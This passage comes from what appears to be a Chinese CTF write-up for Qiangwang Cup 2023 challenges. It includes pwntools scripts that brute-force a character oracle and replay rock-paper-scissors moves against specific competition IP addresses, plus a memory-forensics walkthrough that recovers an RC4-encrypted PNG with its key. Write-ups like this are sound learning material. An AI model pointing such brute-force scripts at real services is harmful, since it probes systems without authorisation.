class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Ok, You moved <span class="hljs-number">99</span> steps<br>Congratulations!! Your flag:<br><br>flag&#123;8486843b4825b381848030880236252b&#125;<br><br></code></pre></td></tr></table></figure><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><p>一个个遍历9位字符<br>返回的0代表该位字符不对，1则代表该位字符正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;error&#x27;</span><br>a = <span class="hljs-number">9</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_string</span>(<span class="hljs-params">data</span>):<br>    r = remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12199</span>)  <span class="hljs-comment"># 远程服务器的地址和端口号，替换为实际值</span><br>    r.recvuntil(<span class="hljs-string">b&quot;Enter a string (should be less than 10 bytes): &quot;</span>)  <span class="hljs-comment"># 接收并丢弃直到遇到指定字符串的输入</span><br>    r.sendline(data)  <span class="hljs-comment"># 发送数据到服务器</span><br>    result = r.recvline().decode().strip()  <span class="hljs-comment"># 接收服务器回传的数据</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(result)<br>        os.system(exit)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sent:&quot;</span>, data)  <span class="hljs-comment"># 打印发送的数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received:&quot;</span>, result)  <span class="hljs-comment"># 打印接收到的数据</span><br>    r.close()  <span class="hljs-comment"># 关闭与服务器的连接</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_correct_string</span>(<span class="hljs-params">current_string, position</span>):<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> a<br>    charset = string.digits + string.ascii_letters  <span class="hljs-comment"># 可能字符的集合，digits 是数字，ascii_letters 是字母</span><br><br>    <span class="hljs-keyword">if</span> position == <span class="hljs-number">9</span>:  <span class="hljs-comment"># 达到字符串的长度上限</span><br>        result = send_string(current_string)  <span class="hljs-comment"># 发送当前字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>:  <span class="hljs-comment"># 如果结果的最后一个字符是 &#x27;1&#x27;，表示字符串是正确的</span><br>            <span class="hljs-keyword">return</span> current_string<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> charset:  <span class="hljs-comment"># 遍历可能的字符集合</span><br>        test_string = ( flag + c +<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(flag))).encode()  <span class="hljs-comment"># 组合测试字符串，将未使用的位置填充为 &#x27;0&#x27;</span><br>        result = send_string(test_string)  <span class="hljs-comment"># 发送测试字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))] == <span class="hljs-string">&#x27;1&#x27;</span>: <br>            flag = flag + <span class="hljs-built_in">chr</span>(test_string[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))])<br>            <span class="hljs-built_in">print</span>(flag)<br>            recursive_result = find_correct_string(test_string.decode(), position+<span class="hljs-number">1</span>)  <span class="hljs-comment"># 递归调用，继续验证下一个字符位置</span><br>            <span class="hljs-keyword">if</span> recursive_result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 如果递归结果不为空，表示找到了正确的字符串</span><br>                <span class="hljs-keyword">return</span> recursive_result<br>          <br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 如果在所有可能的字符中都未找到正确的字符串，则返回 None</span><br><br>correct_string = find_correct_string(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 从空字符串开始验证</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct string:&quot;</span>, correct_string)  <span class="hljs-comment"># 打印正确的字符串</span><br></code></pre></td></tr></table></figure><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆破求解 发现机器出拳在前面出拳顺序相同的情况下始终不变 </span><br><span class="hljs-comment"># 每轮剪刀石头布都尝试一次</span><br><span class="hljs-comment"># 获胜则记录下出拳, 用于下一次的求解</span><br><span class="hljs-comment"># 运行爆破后再手动将输出结果粘贴到success函数</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span><br><br>link = <span class="hljs-string">&#x27;nc 8.147.129.191 42289&#x27;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br><br>winning_strategy = []<br><br><span class="hljs-comment"># while len(winning_strategy) &lt; 100:</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">0</span>:<br>    p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    p.recv()<br>    <span class="hljs-comment"># out = (p.recv().decode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    <span class="hljs-comment"># out = p.recvuntil(&#x27;你的分数：&#x27;.encode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>    <span class="hljs-comment"># print(p.recvuntil(b&#x27;-----------------------------------&#x27;,drop=1),end=&#x27;\t&#x27;)</span><br>    <span class="hljs-comment"># print(out)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>        out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>        <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&#x27;\t&#x27;</span>)<br>        <span class="hljs-comment"># print(out)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;你赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            winning_strategy.append(i)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;平局&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;Me10n赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] pass&#x27;</span>)<br>        p.close()<br>        p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>            p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>        <span class="hljs-comment"># print(out.decode(encoding=&#x27;utf8&#x27;, errors=&#x27;ignore&#x27;))</span><br>    p.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(winning_strategy), winning_strategy)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>():<br>    win = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> win:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br><br>success()<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="SpeedUp"><a href="#SpeedUp" class="headerlink" title="SpeedUp"></a>SpeedUp</h3><p><a href="https://oeis.org/A244060/list">https://oeis.org/A244060/list</a><br>直接接看2^27</p><h3 id="找到PNG了吗"><a href="#找到PNG了吗" class="headerlink" title="找到PNG了吗"></a>找到PNG了吗</h3><p>不太会Linux内存取证，用R-studio看了一下，没找到啥有用的东西，直接Strings 找到PNG了吗.mem（这个过程要耗一点时间，文件太大了）<br>然后在字符串中翻看到一处加密程序<br><img src="/mdimg/qwb2023/1.png"><br>主要加密函数如下，根据 rc4_encrypt_decrypt可以看出这是一个对文件进行RC4加密的程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-built_in">int</span> a=<span class="hljs-number">0</span>;<br>    char q[<span class="hljs-number">10</span>];<br>    unsigned char key[]=<span class="hljs-string">&quot;do_not_care&quot;</span>;<br>    unsigned char key2[] = <span class="hljs-string">&quot;where_is_the_key&quot;</span>;<br>    FILE* file = fopen(<span class="hljs-string">&quot;have_your_fun.jocker&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file == NULL) &#123;<br>        printf(<span class="hljs-string">&quot;open file failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    unsigned char *<span class="hljs-built_in">str</span>;<br>    <span class="hljs-built_in">str</span> = (char *) malloc(<span class="hljs-number">20000</span>);<br>    memcpy(<span class="hljs-built_in">str</span>, buff, <span class="hljs-number">20000</span>);<br>rc4_encrypt_decrypt(key2, <span class="hljs-built_in">str</span>, <span class="hljs-number">20000</span>);<br>    printf(<span class="hljs-string">&quot;please give me the key of fun:&quot;</span>);<br>    scanf(<span class="hljs-string">&quot;%s&quot;</span>,q);<br>    rc4_encrypt_decrypt(key, <span class="hljs-built_in">str</span>, <span class="hljs-number">20000</span>);<br>    <br>    fwrite(buff, <span class="hljs-number">1</span>, <span class="hljs-number">20000</span>, file);<br>    printf(<span class="hljs-string">&quot;maybe you go wrong&quot;</span>);<br>    fclose(file);<br>    close(clientSocket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>再根据题目信息猜测这个加密程序对发送的png图片做了处理，所以我们逆向思维去找加密后的png图片，以png文件头为特征值RC4加密得到，新的文件头<code>0e 3c b4 2f 99 96 95 56</code><br><img src="/mdimg/qwb2023/2.png"><br><img src="/mdimg/qwb2023/3.png"><br>往下翻，看到一些无效数据，所以在这里下断点，将上面的hex数据另存为文件，再用赛博厨子解密即可<br><img src="/mdimg/qwb2023/4.png"><br><a href="https://cyberchef.cn/#recipe=To_Hex('Space',0)RC4(%7B'option':'UTF8','string':'do_not_care'%7D,'Hex','Latin1')To_Hex('Space',0/disabled)Render_Image('Raw')&input=Djy0L5mWlVa%2Ba%2B/pQkhdGNUXemfs8DMUX0aar/xADCXQusOwoIskPQRXYX3sfWfZidGPJ1uM4Tk13pVKniN23LZXVSm7ZIGfFniwZwHKUxr%2B%2Bj0YkHCzR3BeQnszEuY/HCRN/mCwxzKm6NBbVj6SXUhMscmko8ugK7FhejOTl9ktAGE9NEcw/xWJVeXVA5nR9hVn13gAH9PDOHzgrnxFhARF64giI4Ou%2B6ROhmWuZMpGKt4LespSJNqj0r9XTrYVrWpF1qn9NXdC3GCO1NSd4Y7NtJFBWAzlMuXxIM5i3z64cLkspdQR0qRi33W5QvzE4KBt4%2Bp0u4Zwvl4RaMW3UGwA2lBrrjzOTMA%2Bbd4be7mru04srcktpuBuVkDGb6KJAXO74qu1QMx2wPFY2td5ohJtD4IZbsFp9G9oyYDg42IbaOSlPWxelCKDz0cZAqlzt6vEkbidlBsyoWyoi8hIYr2k%2BaZ8t8dpFHPBCg0C1a1xtnb5Myjr99vDQfNUVfJ7K1rlWLxw3ulb0M4dIde4SwlNsUjM0CMYOIWBlQHPFqNjSXQNoETanSap0%2Bkf2Ncblh5E6Z81Cd9AEE7NV4FIbyeKlLaFEhrUdBf0%2BGXG7LZs2bWsTW1zPG2H2CYndxh9SuNUyjJYmPhcr88yk65ePanzQdyAg9y3XJM8L4zry4YEAnfum%2BVdxXDT0C1yqJUUI1Ywmfy6yMjzaLwDeJmJiQJ93rT8y7kqnjki1uvDK%2BEl6BzMr3OWeGKlbci%2BdAPamVTscJsmWYHCRQgdP/U9FiJED5g05YFC6PJvR92gNpspbf8UcPkN4WstbLbmMYBx4Z/gVB%2BQhTSY0uAKge9gnBZtnmu5a2NQwapC9GFJVJ9kmWXW3kylTLCH69PDg9A4GOvCY7vjhL5DH%2BZWU7yTayn%2BPPYpksB98mgP1VcCQzk79xVcs8edOCcSAo4vNypAFYN4lMni%2BhvG3mo7xBwWdU1Wdd00xzyHyAAbpTgjgXpAvNh9luxmhzz31%2BQP9SnZitm1cqxIsFuokZzwA7RAbNYd14/CHRS3Y4TJ6Tb8IuiDqa2ERGh9GBMD6CYfOfVzH0sRrCG2X9l5Cz/8ZhG367j6ufk3ynT2RQlzkKz7kd/rU1o8fK0nIa2Mgm%2BHndMvfLF/hE85C1D0Dg3pEVOUJ4xt72Q10s%2BorlbGtNt6qLo%2BmlBasagWqffqp%2B0qFg%2BagkHu1d8/UEhOapAw3qtWd6iQ5c0kXRYeGfGJwJjkURuHTOMPxnN6anxqrp47GqKSU8DVjuCGnSbG%2BsMTygEMaaV/EfFhh/rJPckMLVuBvOjO49KsW6AoVkIji8ICEuDVQZE1o99p2hgTU7q91i/c0zdzYz8u%2BzVNo/A3znyPUrHO68mU47TzfD8s2tMGJW7%2BYHAnkR0D%2BD1f82tmchEtJmbt2bHBkEhNyU/MtFZ/h2LzeVBWdFXmDTRQVSunO5R7HkwwkH5Ao9PyhmfvO1N0aspxpKRykS1fv8GryvNwNm/z02x9mYt0HKPZVHMpsfrGomRXfV8%2BKQR5Jj%2BRExJJ4rD3CZpeOdwtCYY7cxHeWMNPdt8/8Y0CXMC0zKltpwF8D5jjVoqdMbaCxLkXlWxBiPUOTfIDKAOtd798t%2BDsvjV8fR6yCID3L4s1BV8%2B5/c6Oarc/1oh%2Bj65PbzeWJjrJHa4Ve18S0S/HZECA%2BhV6X37HW69TFSVGpJwes%2Bj0PM4Gj0MwHiE1WgVGzHk3oyQG015mTJkvgz0V8nQpA6%2BFHqHalh2YCR2gYJxLIBzVI/7iMzdQZVdsbZsPnLE9StlQfymRE1725udSzL%2BP8MXy5pyEJDHOLnhSamNywH0C8NaS/gwsziqwg3WyHH8pgJJ2iwPE/G6SjhWTO5f84iO10kAFeAo%2B0pbRSgxR4w04pflggZ6bVPJOP0VfmkalUVfI7ACsmPuiWSzA3ORRlKPOSDGAZR7/6t0trA/WiCS1fj9PoirpojrwWBj9EiAZstv2k7YeVk9T1qn4zXShqzpVlJA8H04AIThB5tMDVJb9CPZ%2Be3OAxmoF3ACWJaHNOz7U1TAgb25mvvYlL0VvuCAzEinFtW/exXt8aYeO0i4BAEmRLemzJSRNxl4100u3lqvGOgUvi8L%2BBOEh8X3fZnEgpbH8PFVrX%2BerZFH%2BXr3NavkhwJVJTAj0xt7c4V6V14iHLrItQSOtR0dSL8KY0pn9xFsAqIUehfjFOW6mGq8ZIAnbGopoqHGBNGfJj5QTMBsSG2WaxE4aBSIW7QiFy7E/5mHB23MM%2BKOLwXAHJIVU7eCdt/Cbvz412fZN0vL2et8hqlVXysZ4s4U6WHoMtm%2B6F7VpNB69NNgsmwoefLfOF3KF/ROsWgcee%2BJtHQ73SF9gG6tBV%2BcnkQa4FySWUVhGA9Sj3P2YBszCc01icoT1GoA3qtoAisVgzpLK00BjwNGfM3jrYdfFB4RK0aoapH1FNW8dS6bJ1UPWDUOj5Xfm0ucrqD0jxUdGbZrplg0M%2BgX4l9kIMXCwGfhaY%2Bo5IqAmmLaKvROgNo6n5DsgwEApK13o7k8EikxEbgw/Q5CFH28bpD/g6r3/jp0jlV65T2QgJx2ThzNNPntbd9oOZMcv4gJN%2BYSQ0tP4mKLyO15SbQVI1X0ND2aDqnhKv8Vw0mydEZMQOZUe11NERYJ7cAGBkL8gbNLNKcG6m1ZExBD/jp8ezd1a4rkaxY3S9zrHBJ80GnS%2BG%2BsqtYEVJ5MjvPIII9qJtoOk%2BWl1sF9XcBm/PI2HvZv/KHovD/3dr1OdLu6Dqf6EnJhfA92UwDj/VOAwGYxtt2l7gNeJ4lhT8mWm4jJe2UKW8nhGOeOgfhpPCkr7pt6GS8s%2Bubgx0lqrzM2f2Py9t5riRRGIXNROLBRWQvyn/42Kme8ql6%2B67fTliyxwY42E7OS1QEdtA6/Ys/HJWs9QZ7RMDGNtBY3%2BLwGy5NV92DzVPmycKCB4LhvRt1zfv1WVM/uWEYmqq5SVSbmR8AMW5lTT2WHMfnEhXj5leW17j/aQg5wmFX5kl8NTodyZ7OtesXKnP1dNIp%2BnJMhnm0dOqr/cK4XvbcoHcnAurnySVjAAO/tP3wRcp2K4IArX7QCkbLr92eFaX0TP%2BvVjmwYM9JTXNyBcfUu%2BcLIWGrUfQ0nQ0VeSgn0w96usmb6vXrDByWEKwfgl5dsUPBPKEttmPFAulPQpbs0ikCWRh23QYM9nr3aB66PNeHoE%2BjKQsQTUhVQUoJ9J7pukRyldlT//JxZylrKZcfYrgJtPDtjE%2BBFRq%2BbUjifVHeX2ejJW%2BvQJmsdAKOjdPzxKpjv/8D37LNEIImgnWWx14YoavYHTKfZn6Y%2BbSLuwEbgMnftSBqCPefltedjci87iGmMUsjnzBwRUVQtsaMeFtiREiGp8eyfHjiON1iV8SZUjxc62Y5zzVlwf0geBTpISiJ4QbwMmdfXRPSBWAxUGs/ukuI1mZZzTq3n%2BESl7Z09UE5sHAOBQnZTV4jsxI3Mh3cnXg%2BbUUGibNa4uI/211zUWvZr0mScnwj0GRbc%2B5QZF5ZnAE5D33nyhNy8iAemQhBYaJQSzJgs8tcMLgi7igehuAN79gHPHfLteDrJlXPAXMnGgsMKxxoXaR9RE7S2ak1lDSdDxVcb6VwU2/You47Huy/Bk/aQS48I%2BK6L795qpdwoeL6Gf2A/3Qv86eKjAZNxquVez6lFzmncLLWEl2WGH4zR47IeZzATtY%2BnCkoYyqyeJyVK6a67oUAzB0Pf1tXrZ%2BXZGMsZmHocQdABbrxLaSh7zVCeklSaGAf3qYlQolE9kd7AOdEq7eOyyNZSZQRnGvTHsIx%2BvU1MIt62jGB5Gou9cwz7zcAjPrm9OqUMR3IIgj8qZdFjzzJ8oUcHifK1BOaB7lo2TmCZchd9yrm%2BikNFTAAAAAAAAAAAIF37vXZVAAAAAP6mHjYAAAEAAAAAAAAAoDI46WZ/">https://cyberchef.cn/#recipe=To_Hex(‘Space’,0)RC4(%7B’option’:’UTF8’,’string’:’do_not_care’%7D,’Hex’,’Latin1’)To_Hex(‘Space’,0/disabled)Render_Image(‘Raw’)&amp;input=Djy0L5mWlVa%2Ba%2B/pQkhdGNUXemfs8DMUX0aar/xADCXQusOwoIskPQRXYX3sfWfZidGPJ1uM4Tk13pVKniN23LZXVSm7ZIGfFniwZwHKUxr%2B%2Bj0YkHCzR3BeQnszEuY/HCRN/mCwxzKm6NBbVj6SXUhMscmko8ugK7FhejOTl9ktAGE9NEcw/xWJVeXVA5nR9hVn13gAH9PDOHzgrnxFhARF64giI4Ou%2B6ROhmWuZMpGKt4LespSJNqj0r9XTrYVrWpF1qn9NXdC3GCO1NSd4Y7NtJFBWAzlMuXxIM5i3z64cLkspdQR0qRi33W5QvzE4KBt4%2Bp0u4Zwvl4RaMW3UGwA2lBrrjzOTMA%2Bbd4be7mru04srcktpuBuVkDGb6KJAXO74qu1QMx2wPFY2td5ohJtD4IZbsFp9G9oyYDg42IbaOSlPWxelCKDz0cZAqlzt6vEkbidlBsyoWyoi8hIYr2k%2BaZ8t8dpFHPBCg0C1a1xtnb5Myjr99vDQfNUVfJ7K1rlWLxw3ulb0M4dIde4SwlNsUjM0CMYOIWBlQHPFqNjSXQNoETanSap0%2Bkf2Ncblh5E6Z81Cd9AEE7NV4FIbyeKlLaFEhrUdBf0%2BGXG7LZs2bWsTW1zPG2H2CYndxh9SuNUyjJYmPhcr88yk65ePanzQdyAg9y3XJM8L4zry4YEAnfum%2BVdxXDT0C1yqJUUI1Ywmfy6yMjzaLwDeJmJiQJ93rT8y7kqnjki1uvDK%2BEl6BzMr3OWeGKlbci%2BdAPamVTscJsmWYHCRQgdP/U9FiJED5g05YFC6PJvR92gNpspbf8UcPkN4WstbLbmMYBx4Z/gVB%2BQhTSY0uAKge9gnBZtnmu5a2NQwapC9GFJVJ9kmWXW3kylTLCH69PDg9A4GOvCY7vjhL5DH%2BZWU7yTayn%2BPPYpksB98mgP1VcCQzk79xVcs8edOCcSAo4vNypAFYN4lMni%2BhvG3mo7xBwWdU1Wdd00xzyHyAAbpTgjgXpAvNh9luxmhzz31%2BQP9SnZitm1cqxIsFuokZzwA7RAbNYd14/CHRS3Y4TJ6Tb8IuiDqa2ERGh9GBMD6CYfOfVzH0sRrCG2X9l5Cz/8ZhG367j6ufk3ynT2RQlzkKz7kd/rU1o8fK0nIa2Mgm%2BHndMvfLF/hE85C1D0Dg3pEVOUJ4xt72Q10s%2BorlbG